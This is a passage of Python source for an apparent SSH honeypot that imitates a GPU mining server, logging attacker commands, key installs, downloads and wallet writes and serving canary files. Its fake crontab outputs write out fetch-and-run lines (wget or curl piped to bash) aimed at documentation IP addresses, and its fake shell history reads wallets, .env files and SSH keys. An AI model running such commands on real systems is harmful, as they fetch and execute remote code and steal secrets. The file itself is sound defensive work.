"""Fake SSH honeypot (paramiko). Accepts logins + commands, answers like a real
Linux box, and — importantly — accepts SSH port-forward / tunnel requests
(direct-tcpip) to RECORD what the attacker wants to relay (destination + the
bytes they push) WITHOUT ever forwarding them. We observe the relay intent; we
never become an actual open relay (that would be facilitation/abuse).
Threaded (paramiko is blocking); events go through the same log pipeline.
"""
import datetime
import hashlib
import json
import os
import re
import socket
import threading
import time
import uuid

import paramiko

from capture import filetype as _filetype
from data_theft import CANARY_FILES, CANARY_FILES_SHORT, FAKE_ENV_VARS, emit_canary_event

try:
    import persona as _persona            # adaptive persona + LLM-backed shell
except Exception:
    _persona = None

try:
    import strategist as _strat           # AI deception strategist (active steering)
except Exception:
    _strat = None

_CANARY_TRIGGERED = None  # global: set by fake_unix when canary file accessed

BANNER = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6"
SAMPLE_DIR = os.environ.get("SAMPLE_DIR", "/data/samples")
_HOSTKEY = None

# IP -> set of installed pubkey strings. Persisted to /data/installed_keys.json
# so bot-installed backdoors survive container restarts.
_KEYS_FILE = os.path.join(os.environ.get("DATA_DIR", "/data"), "installed_keys.json")
_KEYS_LOCK = threading.Lock()

def _keys_load() -> dict:
    try:
        with open(_KEYS_FILE, "r") as f:
            raw = json.load(f)
        return {ip: set(keys) for ip, keys in raw.items()}
    except (OSError, ValueError):
        return {}

def _keys_save(d: dict) -> None:
    try:
        with open(_KEYS_FILE, "w") as f:
            json.dump({ip: list(keys) for ip, keys in d.items()}, f)
    except OSError:
        pass

_INSTALLED_KEYS: dict = _keys_load()

# Valid credentials observed from attackers — accepted on any future attempt.
# Persisted to /data/valid_creds.json so they survive restarts.
_CREDS_FILE = os.path.join(os.environ.get("DATA_DIR", "/data"), "valid_creds.json")
_CREDS_LOCK = threading.Lock()

def _creds_load() -> set:
    try:
        with open(_CREDS_FILE) as f:
            return set(tuple(x) for x in json.load(f))
    except (OSError, ValueError):
        return set()

def _creds_save() -> None:
    try:
        with open(_CREDS_FILE, "w") as f:
            json.dump([list(x) for x in _VALID_CREDS], f)
    except OSError:
        pass

_VALID_CREDS: set = _creds_load()

# Per-IP established credential: a real box has ONE password. The first cred an
# IP tries becomes THE working one; every OTHER cred from that IP then fails,
# just like a real server. This kills the "any password works" honeypot tell.
# Persisted so it survives restarts (an attacker who returns finds the same PW).
_IPCRED_FILE = os.path.join(os.environ.get("DATA_DIR", "/data"), "ip_creds.json")
_IPCRED_MAX  = 50000

def _ipcred_load() -> dict:
    try:
        with open(_IPCRED_FILE) as f:
            return json.load(f)
    except (OSError, ValueError):
        return {}

def _ipcred_save() -> None:
    try:
        with open(_IPCRED_FILE, "w") as f:
            json.dump(_IP_CRED, f)
    except OSError:
        pass

_IP_CRED: dict = _ipcred_load()

# Known honeypot-detection credentials used by some botnets.
# They try these AFTER a successful login: real server → FAIL, permissive honeypot → SUCCESS.
# We always reject them to avoid fingerprinting.
_HONEYPOT_TEST_CREDS = {
    ("345gs5662d34", "345gs5662d34"),
    ("3245gs5662d34", "3245gs5662d34"),
}
_HONEYPOT_TEST_PASS_SUFFIX = "3245gs5662d34"

# Global map: script filename -> sample path. Survives across SSH sessions so
# exec-channel sessions can simulate scripts uploaded in earlier SFTP sessions.
_KNOWN_SCRIPTS: dict = {}  # e.g. {"setup.sh": "/data/samples/783adb7..."}
_SCRIPTS_LOCK = threading.Lock()

def _scripts_load() -> None:
    """Pre-populate _KNOWN_SCRIPTS from already-captured samples on disk."""
    known = {"setup.sh", "clean.sh"}
    try:
        for f in os.listdir(SAMPLE_DIR):
            path = os.path.join(SAMPLE_DIR, f)
            try:
                with open(path, "rb") as fh:
                    head = fh.read(128)
                if head.startswith(b"#!") and b"bash" in head:
                    # Read first 256 bytes to check for known script markers
                    with open(path, "rb") as fh:
                        content = fh.read(512).decode("latin-1", "replace")
                    for name in known:
                        if name not in _KNOWN_SCRIPTS:
                            # Match setup.sh by get_random_string / redtail pattern
                            if name == "setup.sh" and "get_random_string" in content:
                                _KNOWN_SCRIPTS[name] = path
                            elif name == "clean.sh" and "c3pool_miner" in content:
                                _KNOWN_SCRIPTS[name] = path
            except OSError:
                pass
    except OSError:
        pass

# Detects:  echo "ssh-rsa AAAA... comment" > ~/.ssh/authorized_keys
#       or  echo "ssh-rsa AAAA... comment" >> ~/.ssh/authorized_keys
_AUTHKEYS_RE = re.compile(
    r'echo\s+"((?:ssh-\S+|ecdsa-\S+|sk-\S+)\s+\S+(?:\s+\S+)?)"\s*>{1,2}\s*~?[./]*\.?ssh/authorized_keys',
    re.IGNORECASE,
)
def _decode_hex_escapes(s: str) -> str:
    """Decode shell \\xNN sequences: '\\x61\\x75...' -> 'au...'"""
    out, i = [], 0
    while i < len(s):
        if s[i] == '\\' and i + 3 < len(s) and s[i+1] == 'x':
            try:
                out.append(chr(int(s[i+2:i+4], 16)))
                i += 4
                continue
            except ValueError:
                pass
        out.append(s[i])
        i += 1
    return ''.join(out)


def _save_upload(name, data, sess):
    """Store an attacker-uploaded file (SCP/SFTP) into the sample store."""
    if not data:
        return
    os.makedirs(SAMPLE_DIR, exist_ok=True)
    sha = hashlib.sha256(data).hexdigest()
    path = os.path.join(SAMPLE_DIR, sha)
    if not os.path.exists(path):
        with open(path, "wb") as f:
            f.write(data)
    sess["uploads"].append({"name": name, "sha256": sha, "size": len(data),
                            "path": path, "filetype": _filetype(data),
                            "url": f"ssh-upload:{name}", "depth": 0})
    # Update global script cache for cross-session simulation
    if name.endswith(".sh"):
        with _SCRIPTS_LOCK:
            _KNOWN_SCRIPTS[name] = path


def _hostkey(path="/data/ssh_host_rsa"):
    global _HOSTKEY
    if _HOSTKEY:
        return _HOSTKEY
    try:
        _HOSTKEY = paramiko.RSAKey(filename=path)
    except Exception:
        _HOSTKEY = paramiko.RSAKey.generate(2048)
        try:
            _HOSTKEY.write_private_key_file(path)
        except Exception:
            pass
    return _HOSTKEY


_CPU = 256
_RAM = 1024
_GPU = 8
_HOST = "gpu-node-07"

_PS_LIST = (
    "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n"
    "root           1  0.0  0.0 168632 11832 ?        Ss   Jun15   0:02 /sbin/init\n"
    "root         123  0.0  0.0  72424  7816 ?        Ss   Jun15   0:00 /usr/sbin/sshd -D\n"
    "root         412  0.0  0.0  18084  2240 ?        S    Jun15   0:00 /usr/sbin/cron -f\n"
    "root        5244  0.0  0.0  72424  7164 ?        Ss   03:38   0:00 sshd: root@pts/0\n"
    "root        5248  0.0  0.0  10892  5876 pts/0    Ss   03:38   0:00 -bash\n"
    "root        5251  0.0  0.0  13624  3800 pts/0    R+   03:42   0:00 ps aux\n"
)

_BASH_HISTORY = (
    "nvidia-smi\n"
    "nproc\n"
    "ls -la\n"
    "cat config.json\n"
    "cat .env\n"
    "cat .wallet\n"
    "cat wallet.dat\n"
    "cat .ssh/id_ed25519\n"
    "printenv\n"
    "./xmrig --config config.json\n"
    "ps aux | grep xmrig\n"
    "tail -f miner.log\n"
    "./xmrig --config config.json --background\n"
    "nvidia-smi dmon -s u\n"
    "uptime\n"
    "free -h\n"
)

UNIX_FAKE = {
    "whoami": "root\n",
    "id": "uid=0(root) gid=0(root) groups=0(root),44(video)\n",
    "hostname": f"{_HOST}\n",
    "pwd": "/root\n",
    "uname": "Linux\n",
    "uname -a": f"Linux {_HOST} 6.5.0-44-generic x86_64 GNU/Linux\n",
    "uname -m": "x86_64\n",
    "uname -p": "x86_64\n",
    "uname -mp": "x86_64 x86_64\n",   # setup.sh: ARCH=$(uname -mp) → x86_64 branch
    "uname -s": "Linux\n",
    "uname -r": "6.5.0-44-generic\n",
    "uname -n": f"{_HOST}\n",
    "ls": "xmrig  srbminer  scripts  share  config.json  miner.log\n",
    "ls -la": f"total 512\ndrwx------ 14 root root  4096 Jun 16 03:42 .\ndrwxr-xr-x 24 root root  4096 May 20 11:15 ..\n-rw-------  1 root root 12288 Jun 16 03:30 .bash_history\n-rw-r--r--  1 root root   512 Jun 15 22:10 config.json\n-rw-r--r--  1 root root   892 Jun 15 22:12 .env\n-rw-r--r--  1 root root    45 Jun 15 22:11 .wallet\n-rw-r--r--  1 root root 87432 Jun 15 22:11 wallet.dat\ndrwx------  2 root root  4096 Jun 15 20:00 .ssh\ndrwxr-xr-x  3 root root  4096 Mar 12 03:00 xmrig\ndrwxr-xr-x  4 root root  4096 Feb 28 18:45 srbminer\ndrwxr-xr-x  2 root root  4096 Jan 15 07:30 scripts\ndrwxrwxrwx  3 root root  4096 Jun 16 02:55 share\n-rw-r--r--  1 root root 97694 Jun 13 19:44 miner.log\n",
    "cat /etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndeploy:x:1000:1000:GPU Deploy:/home/deploy:/bin/bash\nminer:x:1001:1001:Mining Service:/opt/miner:/sbin/nologin\n",
    "free -m": f"              total        used        free      shared  buff/cache   available\nMem:        {_RAM*1024}       {_RAM*256}       {_RAM*768}          12       {_RAM*128}      {_RAM*1024}\nSwap:         1024           0        1024\n",
    "free -h": f"              total        used        free      shared  buff/cache   available\nMem:           {_RAM//2}Ti        {_RAM//4}Ti        {_RAM*3//4}Ti        12Mi       128Gi        {_RAM//2}Ti\nSwap:         1.0Gi          0B       1.0Gi\n",
    "free -g": f"              total        used        free      shared  buff/cache   available\nMem:           {_RAM}         {_RAM//4}         {_RAM*3//4}           0         {_RAM//8}         {_RAM//2}\nSwap:            1           0           1\n",
    "nproc": f"{_CPU}\n",
    "uptime": f" 03:42:18 up 87 days, 12:34,  2 users,  load average: 255.15, 254.88, 254.67\n",
    "df -h": f"Filesystem      Size  Used Avail Use% Mounted on\n/dev/nvme0n1p2   30T  7.5T   22T  25% /\n/dev/nvme1n1p1  7.0T  3.5T  3.2T  52% /data\ntmpfs           {_RAM//2}Gi     0  {_RAM//2}Gi   0% /dev/shm\n",
    "lscpu": f"Architecture:            x86_64\nCPU(s):                  {_CPU}\nModel name:              Intel(R) Xeon(R) Platinum 8480+\nThread(s) per core:      2\nCore(s) per socket:      64\nSocket(s):               2\nCPU max MHz:             4200.0000\nL3 cache:                210 MiB (2 instances)\nNUMA node(s):            2\n",
    "nvidia-smi": f"Mon Jun 16 03:42:18 2026\n| NVIDIA-SMI 550.127.05     Driver Version: 550.127.05    CUDA Version: 12.6 |\n| GPU  Name                 Persistence-M | Bus-Id          Disp.A | Volatile Uncorr. ECC |\n| Fan  Temp   Perf          Pwr:Usage/Cap |           Memory-Usage | GPU-Util  Compute M. |\n|   0  NVIDIA A100-SXM4-80GB     On     | 00000000:17:00.0 Off |                    0 |\n| N/A   72C    P0            280W /  350W |   78125MiB /  81920MiB |     99%      Default |\n| Processes: GPU 0: xmrig(78125MiB)\n",
    # Process list — xmrig intentionally absent: bot may try to restart it, revealing pool/wallet args
    "ps": _PS_LIST,
    "ps aux": _PS_LIST,
    "ps -ef": _PS_LIST,
    "ps -e": _PS_LIST,
    "ps -a": _PS_LIST,
    # Crontab — contains competitor-bot persistence entries.
    # clean.sh strips lines matching wget|curl|/tmp|\.sh etc. via pipeline;
    # our pipeline-handler logs the full crontab -l|grep|crontab chain → IOCs.
    # IPs are RFC-5737 documentation ranges (192.0.2/24, 198.51.100/24) — never real C2.
    "crontab -l": (
        "*/10 * * * * wget -q -O - http://192.0.2.100/.x/up.sh 2>/dev/null | bash\n"
        "@reboot /tmp/.x/svc --config /tmp/.x/cfg.json -B\n"
        "*/5 * * * * curl -s http://198.51.100.50/cron.sh | sh\n"
    ),
    "crontab -l 2>/dev/null": (
        "*/10 * * * * wget -q -O - http://192.0.2.100/.x/up.sh 2>/dev/null | bash\n"
        "@reboot /tmp/.x/svc --config /tmp/.x/cfg.json -B\n"
        "*/5 * * * * curl -s http://198.51.100.50/cron.sh | sh\n"
    ),
    "cat /etc/crontab": (
        "# /etc/crontab: system-wide crontab\nSHELL=/bin/sh\n"
        "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n"
        "*/15 * * * * root curl -s http://203.0.113.77/sysupdate | bash\n"
    ),
    # Shell history — looks legit, shows prior mining activity
    "history": _BASH_HISTORY,
    "cat /root/.bash_history": _BASH_HISTORY,
    "cat ~/.bash_history": _BASH_HISTORY,
    # Network config
    "ip addr": (
        "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN\n"
        "    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n"
        "    inet 127.0.0.1/8 scope host lo\n"
        "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP qlen 1000\n"
        "    link/ether 00:16:3e:ab:cd:ef brd ff:ff:ff:ff:ff:ff\n"
        "    inet 164.68.121.252/22 brd 164.68.123.255 scope global eth0\n"
    ),
    "ip a": (
        "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN\n"
        "    inet 127.0.0.1/8 scope host lo\n"
        "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP\n"
        "    inet 164.68.121.252/22 brd 164.68.123.255 scope global eth0\n"
    ),
    "ifconfig": (
        "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n"
        "        inet 164.68.121.252  netmask 255.255.252.0  broadcast 164.68.123.255\n"
        "        ether 00:16:3e:ab:cd:ef  txqueuelen 1000  (Ethernet)\n"
        "lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n"
        "        inet 127.0.0.1  netmask 255.0.0.0\n"
    ),
    "netstat -tlnp": (
        "Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\n"
        "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      123/sshd\n"
        "tcp6       0      0 :::22                   :::*                    LISTEN      123/sshd\n"
    ),
    "netstat -anp": (
        "Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\n"
        "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      123/sshd\n"
        "tcp        0     52 164.68.121.252:22        130.12.180.51:54321     ESTABLISHED 5244/sshd\n"
        "tcp        0      0 164.68.121.252:51234     194.40.243.51:443       ESTABLISHED 9871/.rt_worker\n"
    ),
    # /proc/net/tcp: shows active TLS connection to pool (little-endian hex IPs)
    # 164.68.121.252 = FC797944  port 22=0016  port 51234=C822
    # 194.40.243.51  = 33F328C2  port 443=01BB
    "cat /proc/net/tcp": (
        "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n"
        "   0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 13421 1 0000000000000000 100 0 0 10 0\n"
        "   1: FC797944:C822 33F328C2:01BB 01 00000000:00000000 00:00000000 00000000     0        0 45231 1 0000000000000001 20 0 0 10 -1\n"
        "   2: FC797944:0016 3300080C:FDC3 01 00000000:00000034 02:000B3C0A 00000000     0        0 23456 4 0000000000000002 20 4 24 10 -1\n"
    ),
    "ss -tlnp": (
        "State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port  Process\n"
        "LISTEN  0       128     0.0.0.0:22            0.0.0.0:*          users:((\"sshd\",pid=123,fd=3))\n"
    ),
    "ss -anp": (
        "Netid  State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port  Process\n"
        "tcp    LISTEN  0       128     0.0.0.0:22          0.0.0.0:*          users:((\"sshd\",pid=123,fd=3))\n"
        "tcp    ESTAB   0       52      164.68.121.252:22   130.12.180.51:54321 users:((\"sshd\",pid=5244,fd=4))\n"
    ),
    "w": (
        f" 03:42:18 up 87 days, 12:34,  2 users,  load average: 255.15, 254.88, 254.67\n"
        f"USER     TTY      FROM             LOGIN@   IDLE JCPU   PCPU WHAT\n"
        f"root     pts/0    130.12.180.51    03:38    0.00s  0.01s  0.00s w\n"
    ),
    "last": (
        "root     pts/0        130.12.180.51    Sat Jun 16 03:38   still logged in\n"
        "root     pts/0        130.12.180.51    Sat Jun 16 02:55 - 03:01  (00:06)\n"
        "root     pts/0        130.12.180.51    Sat Jun 15 18:12 - 18:19  (00:07)\n"
        "\nwtmp begins Mon May 20 11:15:02 2026\n"
    ),
    # who: must NOT match "load average|users?," (honeypot detector check)
    "who": "root     pts/0        130.12.180.51    Mon Jun 22 03:38 (2026)\n",
    # w -h: headerless; must NOT match "pts/0.*10.0.0.x" (honeypot detector)
    "w -h": "root     pts/0    130.12.180.51    03:38    0.00s  0.01s  0.00s -bash\n",
    # lspci: NVIDIA GPU — makes GPU fingerprinters think we're valuable
    "lspci": (
        "00:00.0 Host bridge: Intel Corporation Sky Lake-E DMI3 Registers (rev 04)\n"
        "00:02.0 VGA compatible controller: NVIDIA Corporation GA102 [GeForce RTX 3090 Ti] (rev a1)\n"
        "00:1f.0 ISA bridge: Intel Corporation C620 Series Chipset Family LPC (rev 09)\n"
        "01:00.0 3D controller: NVIDIA Corporation GA102GL [RTX A5000] (rev a1)\n"
        "02:00.0 3D controller: NVIDIA Corporation GA100 [A100 SXM4 80GB] (rev a1)\n"
    ),
    "dmidecode -s processor-version": "Intel(R) Xeon(R) Platinum 8480+\n",
    # GNU coreutils help — bot checks cat --help / ls --help to detect BusyBox (embedded)
    "cat --help": (
        "Usage: cat [OPTION]... [FILE]...\n"
        "Concatenate FILE(s) to standard output.\n\n"
        "  -A, --show-all           equivalent to -vET\n"
        "  -b, --number-nonblank    number nonempty output lines, overrides -n\n"
        "  -E, --show-ends          display $ at end of each line\n"
        "  -n, --number             number all output lines\n"
        "  -T, --show-tabs          display TAB characters as ^I\n"
        "  -v, --show-nonprinting   use ^ and M- notation, except for LFD and TAB\n"
        "      --help     display this help and exit\n"
        "      --version  output version information and exit\n\n"
        "GNU coreutils 8.32  <https://www.gnu.org/software/coreutils/>\n"
    ),
    "ls --help": (
        "Usage: ls [OPTION]... [FILE]...\n"
        "List information about the FILEs (the current directory by default).\n\n"
        "  -a, --all                  do not ignore entries starting with .\n"
        "  -l                         use a long listing format\n"
        "  -h, --human-readable       with -l and -s, print sizes like 1K 234M 2G\n"
        "  -r, --reverse              reverse order while sorting\n"
        "  -R, --recursive            list subdirectories recursively\n"
        "  -t                         sort by time, newest first\n"
        "      --help     display this help and exit\n"
        "      --version  output version information and exit\n\n"
        "GNU coreutils 8.32  <https://www.gnu.org/software/coreutils/>\n"
    ),
    # Extra uname variants that bots use for fingerprinting
    "uname -s -v -n -r -m": f"Linux #55-Ubuntu SMP Mon Jun 10 14:22:11 UTC 2026 {_HOST} 6.5.0-44-generic x86_64\n",
    "uname -s -v -n -m":    f"Linux #55-Ubuntu SMP Mon Jun 10 14:22:11 UTC 2026 {_HOST} x86_64\n",
    "uname -s -m":          "Linux x86_64\n",
    "uname -o":             "GNU/Linux\n",
    "uname -v":             "#55-Ubuntu SMP Mon Jun 10 14:22:11 UTC 2026\n",
    # /proc virtual files that bots test for readability
    "cat /proc/self/cmdline": "sshd\x00\x00",
    "cat /proc/uptime":       "7596342.81 7582104.33\n",
    "cat /proc/loadavg":      "255.15 254.88 254.67 3/512 5251\n",
}


def fake_unix(cmd, src_ip=None, sess=None):
    c = cmd.strip()

    # Normalize absolute paths to common bins → bare command name.
    # Bots probe e.g. /usr/bin/nproc, /bin/sh, /sbin/ifconfig to bypass PATH tricks,
    # and /bin/./uname style `./` insertions to dodge naive prefix matching.
    _m_abs = re.match(r'^(?:/usr/local/bin/|/usr/bin/|/usr/sbin/|/bin/|/sbin/)(?:\./)*(\S+)(.*)$', c)
    if _m_abs:
        c = _m_abs.group(1) + _m_abs.group(2)

    # Strip stderr redirections — cosmetic for a fake shell, lets `cmd 2>/dev/null`
    # match the same handler as bare `cmd` (keeps pipes/stdout redirects intact).
    c = re.sub(r'\s*2>\s*/dev/null', '', c)
    c = re.sub(r'\s*2>&1', '', c)
    c = c.strip()

    # Honeypot detector script (185.200.116.211 pattern) — intercept before splitting.
    # The script echoes SSH_HONEYPOT=<reason> or SSH_REAL=1 based on multiple shell checks.
    # Returning the correct response makes us look like a real server.
    if "SSH_HONEYPOT" in c and "SSH_REAL" in c:
        return f"SSH_OK\nuid=0(root) gid=0(root) groups=0(root),44(video)\n{_HOST}\nSSH_REAL=1\n"

    # Shell variable assignments (HP=, VAR=value, etc.) — silent, no output
    if re.match(r'^[A-Za-z_][A-Za-z0-9_]*=', c) and ' ' not in c.split('=')[0]:
        return ""

    # Bracket / test expressions — simulate success, no output
    if c.startswith(("[ ", "[[ ", "test ")):
        return ""

    # Split compound commands — "echo auth_ok; cat ~/.wallet" → process each part
    if (";" in c or " && " in c) and not c.startswith("cat /proc/"):
        parts = re.split(r'\s*(?:;|&&)\s*', c)
        if len(parts) > 1:
            return "".join(
                fake_unix(p, src_ip=src_ip, sess=sess)
                for p in parts if p.strip()
            )

    # --- chattr / lockr: always silent (real Ubuntu has chattr; lockr is a bot alias) ---
    if c.startswith("chattr ") or c.startswith("lockr "):
        return ""

    # --- echo "key" > ~/.ssh/authorized_keys: store key, stay silent ---------
    m = _AUTHKEYS_RE.search(c)
    if m:
        key_str = m.group(1).strip()
        print(f"[ssh-key-install] ip={src_ip} key={key_str[:40]}", flush=True)
        if src_ip:
            with _KEYS_LOCK:
                _INSTALLED_KEYS.setdefault(src_ip, set()).add(key_str)
                _keys_save(_INSTALLED_KEYS)
                print(f"[ssh-key-install] saved to {_KEYS_FILE}", flush=True)
        return ""   # real shell redirect produces no stdout
    if "authorized_keys" in c:
        print(f"[ssh-key-debug] authorized_keys in cmd but no regex match: {repr(c[:80])}", flush=True)

    # --- echo -e with hex escapes (e.g. \x61\x75\x74\x68 = "auth_ok") ------
    if c.startswith("echo -e "):
        payload = c[8:].strip().strip('"').strip("'")
        decoded = _decode_hex_escapes(payload)
        return decoded if decoded.endswith("\n") else decoded + "\n"

    # --- Pipeline commands: log full cmd (valuable IOC) ----------------------
    # For GPU-fingerprinter pipelines, return realistic data so bots see real hw.
    if "|" in c:
        cl = c.lower()
        # lspci | grep -i vga  /  lspci | grep -i nvidia
        if "lspci" in c and re.search(r"vga|nvidia", cl):
            return (
                "00:02.0 VGA compatible controller: NVIDIA Corporation GA102 [GeForce RTX 3090 Ti] (rev a1)\n"
                "01:00.0 3D controller: NVIDIA Corporation GA102GL [RTX A5000] (rev a1)\n"
                "02:00.0 3D controller: NVIDIA Corporation GA100 [A100 SXM4 80GB] (rev a1)\n"
            )
        # lscpu | awk '/Model name/'
        if "lscpu" in c and "Model name" in c:
            return "Model name:              Intel(R) Xeon(R) Platinum 8480+\n"
        # grep "model name" /proc/cpuinfo via pipe
        if "grep" in c and "model name" in cl and "cpuinfo" in c:
            return "model name\t: Intel(R) Xeon(R) Platinum 8480+\n"
        # last | head
        if "last" in c and ("head" in c or "tail" in c):
            return UNIX_FAKE.get("last", "")
        print(f"[pipeline] ip={src_ip} cmd={c[:200]}", flush=True)
        if sess is not None:
            sess.setdefault("pipelines", []).append(c[:200])
        return ""

    # Persona-consistent identity (hostname/uname -n/-a/whoami/id/pwd/ls) so a
    # non-default persona (e.g. corp-secrets) doesn't leak gpu-node-07 identity.
    if _persona is not None and sess is not None:
        try:
            _id = _persona.identity_answer(c, _persona.pick_persona(sess))
            if _id is not None:
                return _id
        except Exception:
            pass

    if c in UNIX_FAKE:
        return UNIX_FAKE[c]

    # --- ps with args not in dict --------------------------------------------
    if c.startswith("ps "):
        return _PS_LIST

    # --- kill / pkill / killall: log target (reveals competing miner names) --
    if c.startswith(("kill ", "pkill ", "killall ")):
        print(f"[kill-attempt] ip={src_ip} cmd={c[:120]}", flush=True)
        if sess is not None:
            sess.setdefault("kill_targets", []).append(c[:120])
        return ""

    # --- Network tools with args not in dict ---------------------------------
    if c.startswith(("netstat ", "ss ", "ip ")):
        return ""

    # --- uname with any flags not in the dict --------------------------------
    if c.startswith("uname"):
        return f"Linux {_HOST} 6.5.0-44-generic #55-Ubuntu SMP Mon Jun 10 14:22:11 UTC 2026 x86_64 GNU/Linux\n"

    # --- grep / awk / sed / tr / cut / xargs: silent, except cpuinfo --------
    if c.startswith("grep ") and "/proc/cpuinfo" in c:
        if re.search(r"model.name|Hardware", c, re.I):
            return "model name\t: Intel(R) Xeon(R) Platinum 8480+\n"
        return ""
    if c.startswith(("grep ", "awk ", "sed ", "xargs ", "tr ", "cut ", "sort ", "uniq ", "wc ")):
        return ""

    # --- dmidecode -----------------------------------------------------------
    if c.startswith("dmidecode"):
        if "processor" in c:
            return "Intel(R) Xeon(R) Platinum 8480+\n"
        return ""

    if c.startswith("cat /proc/cpuinfo"):
        lines = []
        for i in range(8):
            lines.append(f"processor\t: {i}")
            lines.append(f"model name\t: Intel(R) Xeon(R) Platinum 8480+")
            lines.append(f"cpu MHz\t\t: 3800.000")
            lines.append(f"cache size\t: 112640 KB")
            lines.append("")
        return "".join(l + "\n" for l in lines)
    if c.startswith("cat /proc/meminfo"):
        return (f"MemTotal:        {_RAM*1048576} kB\n"
                f"MemFree:         {_RAM*786432} kB\n"
                f"HugePages_Total: 8192\n"
                f"HugePages_Free:  2048\n"
                f"Hugepagesize:    2048 kB\n")
    # --- File write interception — capture attacker wallet/config/cron writes --
    # Catches: echo '...' > config.json, echo '...' | tee .env, etc.
    _TRAP_FILES = ("config.json", "wallet.dat", ".wallet", ".env", "crontab", "cron.d", "authorized_keys2")
    if any(f in c for f in _TRAP_FILES) and (">" in c or "tee" in c):
        _dm = re.search(r'(?:>+\s*|tee\s+)([\w./~-]+)', c)
        dest = _dm.group(1).strip() if _dm else ""
        if any(f in dest for f in _TRAP_FILES):
            content = ""
            _em = re.match(r'(?:echo|printf)\s+(?:-[^\s]+\s+)?["\']?(.*?)["\']?\s*(?:\|[^|]|>|$)', c, re.DOTALL)
            if _em:
                content = _em.group(1).strip().strip("'\"")
            wallets, pools, workers = [], [], []
            for a in re.findall(r'4[0-9A-Za-z]{94}', content):
                wallets.append({"type": "XMR", "addr": a})
            for a in re.findall(r'(?:bc1[a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})', content):
                wallets.append({"type": "BTC", "addr": a})
            pools   = re.findall(r'"url"\s*:\s*"([^"]+)"', content)
            workers = re.findall(r'"(?:user|pass)"\s*:\s*"([^"]+)"', content)
            print(f"[wallet-steal] ip={src_ip} dest={dest} wallets={wallets} pools={pools}", flush=True)
            if sess is not None:
                sess.setdefault("wallet_steals", []).append(
                    {"dest": dest, "content": content[:500],
                     "wallets": wallets, "pools": pools, "workers": workers})
            return ""

    if c.startswith("echo "):
        return c[5:] + "\n"

    # --- wget / curl / tftp: LOG full command (C2 URL extraction) ------------
    if c.startswith(("wget ", "curl ", "tftp ")):
        print(f"[net-download] ip={src_ip} cmd={c[:300]}", flush=True)
        if sess is not None:
            sess.setdefault("net_downloads", []).append(c[:300])
        return ""  # silent = looks like successful download

    # --- Miner-config HIJACK BAIT (before canary: a miner rig's config.json
    # should BE a miner config, not a DB canary). Points at OUR stratum pool, so
    # a mining worm that scans for / takes over existing miners and reuses the
    # config connects to our honeypot → wallet/worker/rig captured. ------------
    global _CANARY_TRIGGERED
    if c.startswith("cat "):
        _mp = c[4:].strip()
        if _mp in ("config.json", ".xmrig.json", "xmrig.json", "/root/config.json",
                   "~/.xmrig.json", "/root/.xmrig.json", "xmrig/config.json",
                   "/root/xmrig/config.json", "~/xmrig/config.json"):
            _pool = os.environ.get("BEACON_HOST", "164.68.121.252")
            return ('{\n  "autosave": true,\n  "cpu": true,\n  "cuda": true,\n  "opencl": true,\n'
                    '  "donate-level": 0,\n  "pools": [\n    {\n'
                    f'      "url": "{_pool}:3333",\n'
                    '      "user": "4AdUndeRxMiNeRpRoDwAlLeT9c7Hq2Lk3mNpQrStUvWxYz0123456789abcd",\n'
                    '      "pass": "gpu-node-07", "keepalive": true, "tls": false,\n'
                    '      "algo": "rx/0"\n    }\n  ]\n}\n')

    # --- Honeytoken Data Traps (canary files + env) --------------------------
    if c.startswith("cat "):
        fpath = c[4:].strip()
        # Normalize ~/path → /root/path for lookup
        fpath_norm = "/root/" + fpath[2:] if fpath.startswith("~/") else fpath
        if fpath_norm in CANARY_FILES:
            _CANARY_TRIGGERED = fpath_norm
            emit_canary_event(fpath_norm, src_ip or "", c)
            return CANARY_FILES[fpath_norm] + "\n"
        short = fpath_norm[len("/root/"):] if fpath_norm.startswith("/root/") else fpath
        if short in CANARY_FILES_SHORT:
            _CANARY_TRIGGERED = fpath_norm
            emit_canary_event(fpath_norm, src_ip or "", c)
            return CANARY_FILES_SHORT[short] + "\n"
    if c in ("env", "printenv"):
        _CANARY_TRIGGERED = "env_vars"
        emit_canary_event("env_vars", src_ip or "", c)
        lines2 = []
        for k, v in FAKE_ENV_VARS.items():
            lines2.append(k + "=" + v)
        lines2.extend(["HOME=/root", "USER=root", "SHELL=/bin/bash",
                       "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"])
        return "\n".join(lines2) + "\n"
    if c.startswith("cat /root/"):
        fname = c[4:].strip()
        if ".wallet" in c:
            _CANARY_TRIGGERED = fname
            emit_canary_event(fname, src_ip or "", c)
            return CANARY_FILES.get("/root/.wallet", "4AbRaCaDaBrAWaLlEtAdDrEsSHeReFake1234567890") + "\n"
        if "miner.log" in c:
            return "[2026-06-16 03:00:01] XMRig 6.22.0 started\n[2026-06-16 03:00:03] POOL #0: pool.hashvault.pro:443\n[2026-06-16 03:00:05] SPEED 10s/60s/15m: 45234 45180 45012 H/s max: 45500\n"
        # For any other file: "not found" → forces bot to upload
        return f"cat: {fname}: No such file or directory\n"

    # --- systemctl / service: log service kills (reveals competing miners) ---
    if c.startswith(("systemctl ", "service ")):
